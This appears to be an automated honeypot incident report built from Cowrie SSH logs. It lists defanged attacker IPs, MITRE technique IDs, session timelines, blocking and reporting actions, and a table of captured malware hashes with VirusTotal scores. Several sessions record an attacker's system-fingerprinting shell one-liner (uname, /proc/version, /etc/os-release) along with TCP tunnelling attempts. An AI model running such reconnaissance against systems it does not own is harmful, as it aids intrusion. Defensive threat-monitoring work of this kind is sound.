| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:48:31` | `cowrie.session.connect` |
| `2026-07-10 20:48:31` | `cowrie.client.version` |
| `2026-07-10 20:48:31` | `cowrie.client.kex` |
| `2026-07-10 20:48:32` | `cowrie.login.success` |
| `2026-07-10 20:48:33` | `cowrie.session.params` |
| `2026-07-10 20:48:33` | `cowrie.command.input` |
| `2026-07-10 20:48:33` | `cowrie.command.input` |
| `2026-07-10 20:48:33` | `cowrie.command.input` |
| `2026-07-10 20:48:33` | `cowrie.command.input` |
| `2026-07-10 20:48:33` | `cowrie.command.input` |
| `2026-07-10 20:48:33` | `cowrie.command.success` |
| `2026-07-10 20:48:33` | `cowrie.command.input` |
| `2026-07-10 20:48:33` | `cowrie.command.input` |
| `2026-07-10 20:48:33` | `cowrie.command.input` |
| `2026-07-10 20:48:33` | `cowrie.command.input` |
| `2026-07-10 20:48:33` | `cowrie.log.closed` |
| `2026-07-10 20:48:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f438ecca102

| Field | Detail |
|---|---|
| **Source IP** | `211.23.109[.]116` |
| **First Seen** | 2026-07-10 20:49 |
| **Last Seen** | 2026-07-10 20:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:49:22` | `cowrie.session.connect` |
| `2026-07-10 20:49:22` | `cowrie.client.version` |
| `2026-07-10 20:49:22` | `cowrie.client.kex` |
| `2026-07-10 20:49:25` | `cowrie.login.success` |
| `2026-07-10 20:49:25` | `cowrie.direct-tcpip.request` |
| `2026-07-10 20:49:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.23.109[.]116` to AbuseIPDB if not already reported
- [ ] Block `211.23.109[.]116` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64d9b0a845d0

| Field | Detail |
|---|---|
| **Source IP** | `171.217.70[.]151` |
| **First Seen** | 2026-07-10 20:49 |
| **Last Seen** | 2026-07-10 20:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:49:35` | `cowrie.session.connect` |
| `2026-07-10 20:49:36` | `cowrie.client.version` |
| `2026-07-10 20:49:36` | `cowrie.client.kex` |
| `2026-07-10 20:49:38` | `cowrie.login.success` |
| `2026-07-10 20:49:39` | `cowrie.direct-tcpip.request` |
| `2026-07-10 20:49:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.217.70[.]151` to AbuseIPDB if not already reported
- [ ] Block `171.217.70[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c2d9adadc07

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-10 20:50 |
| **Last Seen** | 2026-07-10 20:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:50:02` | `cowrie.session.connect` |
| `2026-07-10 20:50:02` | `cowrie.client.version` |
| `2026-07-10 20:50:02` | `cowrie.client.kex` |
| `2026-07-10 20:50:03` | `cowrie.login.success` |
| `2026-07-10 20:50:04` | `cowrie.session.params` |
| `2026-07-10 20:50:04` | `cowrie.command.input` |
| `2026-07-10 20:50:04` | `cowrie.command.input` |
| `2026-07-10 20:50:04` | `cowrie.command.input` |
| `2026-07-10 20:50:04` | `cowrie.command.input` |
| `2026-07-10 20:50:04` | `cowrie.command.input` |
| `2026-07-10 20:50:04` | `cowrie.command.success` |
| `2026-07-10 20:50:04` | `cowrie.command.input` |
| `2026-07-10 20:50:04` | `cowrie.command.input` |
| `2026-07-10 20:50:04` | `cowrie.command.input` |
| `2026-07-10 20:50:04` | `cowrie.command.input` |
| `2026-07-10 20:50:04` | `cowrie.log.closed` |
| `2026-07-10 20:50:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f11bb9cfa7ab

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-10 20:51 |
| **Last Seen** | 2026-07-10 20:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:51:34` | `cowrie.session.connect` |
| `2026-07-10 20:51:34` | `cowrie.client.version` |
| `2026-07-10 20:51:34` | `cowrie.client.kex` |
| `2026-07-10 20:51:35` | `cowrie.login.success` |
| `2026-07-10 20:51:35` | `cowrie.session.params` |
| `2026-07-10 20:51:35` | `cowrie.command.input` |
| `2026-07-10 20:51:35` | `cowrie.command.input` |
| `2026-07-10 20:51:35` | `cowrie.command.input` |
| `2026-07-10 20:51:35` | `cowrie.command.input` |
| `2026-07-10 20:51:36` | `cowrie.command.input` |
| `2026-07-10 20:51:36` | `cowrie.command.success` |
| `2026-07-10 20:51:36` | `cowrie.command.input` |
| `2026-07-10 20:51:36` | `cowrie.command.input` |
| `2026-07-10 20:51:36` | `cowrie.command.input` |
| `2026-07-10 20:51:36` | `cowrie.command.input` |
| `2026-07-10 20:51:36` | `cowrie.log.closed` |
| `2026-07-10 20:51:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de902cdd4c05

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-10 20:53 |
| **Last Seen** | 2026-07-10 20:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:53:08` | `cowrie.session.connect` |
| `2026-07-10 20:53:08` | `cowrie.client.version` |
| `2026-07-10 20:53:08` | `cowrie.client.kex` |
| `2026-07-10 20:53:09` | `cowrie.login.success` |
| `2026-07-10 20:53:10` | `cowrie.session.params` |
| `2026-07-10 20:53:10` | `cowrie.command.input` |
| `2026-07-10 20:53:10` | `cowrie.command.input` |
| `2026-07-10 20:53:10` | `cowrie.command.input` |
| `2026-07-10 20:53:10` | `cowrie.command.input` |
| `2026-07-10 20:53:10` | `cowrie.command.input` |
| `2026-07-10 20:53:10` | `cowrie.command.success` |
| `2026-07-10 20:53:10` | `cowrie.command.input` |
| `2026-07-10 20:53:10` | `cowrie.command.input` |
| `2026-07-10 20:53:10` | `cowrie.command.input` |
| `2026-07-10 20:53:10` | `cowrie.command.input` |
| `2026-07-10 20:53:11` | `cowrie.log.closed` |
| `2026-07-10 20:53:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7854e102eb6f

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-10 20:53 |
| **Last Seen** | 2026-07-10 20:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:53:46` | `cowrie.session.connect` |
| `2026-07-10 20:53:47` | `cowrie.client.version` |
| `2026-07-10 20:53:47` | `cowrie.client.kex` |
| `2026-07-10 20:53:49` | `cowrie.login.success` |
| `2026-07-10 20:53:50` | `cowrie.session.params` |
| `2026-07-10 20:53:50` | `cowrie.command.input` |
| `2026-07-10 20:53:50` | `cowrie.log.closed` |
| `2026-07-10 20:53:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-226d3e7f7864

| Field | Detail |
|---|---|
| **Source IP** | `218.25.233[.]22` |
| **First Seen** | 2026-07-10 20:54 |
| **Last Seen** | 2026-07-10 20:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:54:31` | `cowrie.session.connect` |
| `2026-07-10 20:54:32` | `cowrie.client.version` |
| `2026-07-10 20:54:32` | `cowrie.client.kex` |
| `2026-07-10 20:54:34` | `cowrie.login.success` |
| `2026-07-10 20:54:35` | `cowrie.direct-tcpip.request` |
| `2026-07-10 20:54:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.25.233[.]22` to AbuseIPDB if not already reported
- [ ] Block `218.25.233[.]22` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2b2008e346b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-10 20:54 |
| **Last Seen** | 2026-07-10 20:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:54:45` | `cowrie.session.connect` |
| `2026-07-10 20:54:45` | `cowrie.client.version` |
| `2026-07-10 20:54:45` | `cowrie.client.kex` |
| `2026-07-10 20:54:45` | `cowrie.login.success` |
| `2026-07-10 20:54:46` | `cowrie.session.params` |
| `2026-07-10 20:54:46` | `cowrie.command.input` |
| `2026-07-10 20:54:46` | `cowrie.command.input` |
| `2026-07-10 20:54:46` | `cowrie.command.input` |
| `2026-07-10 20:54:46` | `cowrie.command.input` |
| `2026-07-10 20:54:46` | `cowrie.command.input` |
| `2026-07-10 20:54:46` | `cowrie.command.success` |
| `2026-07-10 20:54:46` | `cowrie.command.input` |
| `2026-07-10 20:54:46` | `cowrie.command.input` |
| `2026-07-10 20:54:46` | `cowrie.command.input` |
| `2026-07-10 20:54:46` | `cowrie.command.input` |
| `2026-07-10 20:54:47` | `cowrie.log.closed` |
| `2026-07-10 20:54:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `107.150.146[.]69` | **155** | 2026-07-10 18:55 | 2026-07-10 20:53 | 87m | 0 | `T1592` | 🟠 MEDIUM |
| `179.61.192[.]156` | **31** | 2026-07-10 19:01 | 2026-07-10 20:52 | 34m | 0 | `T1592` | 🟠 MEDIUM |
| `104.143.10[.]174` | **30** | 2026-07-10 18:56 | 2026-07-10 20:44 | 12m | 0 | `T1592` | 🟠 MEDIUM |
| `72.167.53[.]56` | **10** | 2026-07-10 18:57 | 2026-07-10 19:57 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **5** | 2026-07-10 18:59 | 2026-07-10 20:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `113.250.177[.]24` | **2** | 2026-07-10 19:45 | 2026-07-10 19:47 | 2m | 0 | `T1592` | 🟢 LOW |
| `45.79.128[.]205` | **2** | 2026-07-10 19:08 | 2026-07-10 19:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | **2** | 2026-07-10 19:29 | 2026-07-10 19:37 | 1m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]71` | **2** | 2026-07-10 20:31 | 2026-07-10 20:44 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.130.168[.]66` | 1 | 2026-07-10 19:12 | 2026-07-10 19:13 | 8s | 0 | `T1592` | 🟢 LOW |
| `14.103.115[.]233` | 1 | 2026-07-10 20:13 | 2026-07-10 20:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.127[.]235` | 1 | 2026-07-10 20:09 | 2026-07-10 20:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.127[.]75` | 1 | 2026-07-10 19:04 | 2026-07-10 19:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `160.119.71[.]136` | 1 | 2026-07-10 20:28 | 2026-07-10 20:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `164.92.115[.]22` | 1 | 2026-07-10 20:16 | 2026-07-10 20:17 | 45s | 0 | `T1592` | 🟢 LOW |
| `183.171.155[.]166` | 1 | 2026-07-10 19:38 | 2026-07-10 19:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]162` | 1 | 2026-07-10 19:06 | 2026-07-10 19:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]228` | 1 | 2026-07-10 20:37 | 2026-07-10 20:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `202.22.135[.]5` | 1 | 2026-07-10 20:37 | 2026-07-10 20:37 | 12s | 0 | `T1592` | 🟢 LOW |
| `220.156.49[.]27` | 1 | 2026-07-10 19:15 | 2026-07-10 19:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `223.221.36[.]42` | 1 | 2026-07-10 19:40 | 2026-07-10 19:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `39.164.91[.]67` | 1 | 2026-07-10 20:16 | 2026-07-10 20:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-07-10 19:03 | 2026-07-10 19:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]18` | 1 | 2026-07-10 20:33 | 2026-07-10 20:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.151[.]11` | 1 | 2026-07-10 19:17 | 2026-07-10 19:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-07-10 20:36 | 2026-07-10 20:36 | 23s | 0 | `T1592` | 🟢 LOW |
| `65.20.146[.]109` | 1 | 2026-07-10 20:31 | 2026-07-10 20:31 | 11s | 0 | `T1592` | 🟢 LOW |
| `70.166.167[.]35` | 1 | 2026-07-10 20:31 | 2026-07-10 20:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `82.96.151[.]84` | 1 | 2026-07-10 19:27 | 2026-07-10 19:27 | 12s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 57/100 | 🟡 MEDIUM | **18/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 40/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **23/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/73** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 42/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/73** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/73** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 64/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/73** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 64/100 | 🟡 MEDIUM | **12/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 61/100 | 🟡 MEDIUM | **27/73** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 60/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
